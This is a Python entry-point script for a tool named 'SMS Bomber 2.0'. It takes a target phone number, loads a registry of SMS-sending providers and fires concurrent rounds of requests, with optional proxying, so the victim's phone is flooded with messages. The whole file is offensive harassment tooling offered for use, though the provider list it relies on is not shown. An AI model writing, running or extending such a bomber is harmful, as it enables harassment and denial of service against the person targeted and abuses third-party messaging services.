#!/usr/bin/env python3

import asyncio
import signal
from typing import NoReturn
import argparse
import sys
import os

# Add the parent directory to sys.path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# Change relative imports to absolute
from sms_bomber.core.config import AppConfig
from sms_bomber.core.logger import setup_logger
from sms_bomber.api.providers import ProviderRegistry
from sms_bomber.api.client import APIClient
from sms_bomber.ui.console import ConsoleUI
from sms_bomber.ui.progress import ProgressTracker


def parse_args() -> AppConfig:
    """Parse command line arguments and create configuration."""
    parser = argparse.ArgumentParser(description="SMS Bomber 2.0")
    parser.add_argument("target", help="Target phone number")
    parser.add_argument(
        "-c", "--count", type=int, default=1, help="Number of bombing rounds"
    )
    parser.add_argument(
        "-t", "--threads", type=int, default=5, help="Number of concurrent threads"
    )
    parser.add_argument(
        "-v", "--verbose", action="store_true", help="Enable verbose output"
    )
    parser.add_argument("-x", "--proxy", help="Proxy server (http/https)")

    args = parser.parse_args()
    config = AppConfig(
        target=args.target,
        count=args.count,
        threads=args.threads,
        verbose=args.verbose,
        proxy=args.proxy,
    )
    config.validate()
    return config


async def bomber(config: AppConfig) -> NoReturn:
    """Main bombing coroutine."""
    ui = ConsoleUI()
    ui.display_banner()
    ui.display_config(config)

    registry = ProviderRegistry()
    client = APIClient(timeout=config.timeout, proxy=config.proxy_dict)

    providers = registry.get_all_providers()
    
    # Optional: Quick health check
    if config.verbose:
        ui.console.print(f"[yellow]Loaded {len(providers)} providers[/yellow]")
        ui.console.print("[cyan]Use 'python update_providers.py' to test provider health[/cyan]")
    
    total_requests = len(providers) * config.count
    tracker = ProgressTracker(total_requests)

    with ui.create_progress() as progress:
        task = progress.add_task("Bombing...", total=total_requests)

        async def process_provider(provider):
            data = provider.get_request_data(config.target)
            result = await client.send_request(provider.name, provider.url, data)
            tracker.update(result)
            progress.update(task, advance=1)
            return result

        tasks = []
        semaphore = asyncio.Semaphore(config.threads)

        async def bounded_process(provider):
            async with semaphore:
                return await process_provider(provider)

        for _ in range(config.count):
            for provider in providers:
                tasks.append(asyncio.create_task(bounded_process(provider)))

        results = await asyncio.gather(*tasks)

    ui.console.print(tracker.get_stats_table())


def main() -> None:
    """Application entry point."""
    try:
        config = parse_args()
        logger = setup_logger(config.log_dir)

        def signal_handler(sig, frame):
            logger.warning("Interrupted by user")
            sys.exit(0)

        signal.signal(signal.SIGINT, signal_handler)

        asyncio.run(bomber(config))
    except Exception as e:
        logger.error(f"Application error: {str(e)}")
        sys.exit(1)


if __name__ == "__main__":
    main()
